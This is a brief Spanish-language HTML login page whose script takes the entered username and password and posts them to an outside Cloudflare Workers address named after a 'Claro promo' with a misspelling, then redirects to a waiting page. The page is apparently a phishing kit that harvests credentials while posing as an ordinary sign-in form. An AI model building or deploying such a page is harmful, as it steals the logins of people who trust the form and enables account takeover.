<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
</head>
<body>
  <h2>Formulario de Acceso</h2>
  <form id="loginForm">
    <label>Usuario:</label>
    <input type="text" id="usuario" required><br><br>

    <label>Clave:</label>
    <input type="password" id="clave" required><br><br>

    <button type="submit">Enviar</button>
  </form>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const usuario = document.getElementById("usuario").value;
      const clave = document.getElementById("clave").value;

      // Llamada al Worker
      const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ usuario, clave })
      });

      const data = await res.json();

      if(data.ok) {
        // Redirige a la página de espera con el id temporal
        localStorage.setItem("LOGIN_ID", data.id);
        window.location.href = "esperando.html";
      } else {
        alert("❌ Error: " + data.error);
      }
    });
  </script>
</body>
</html>
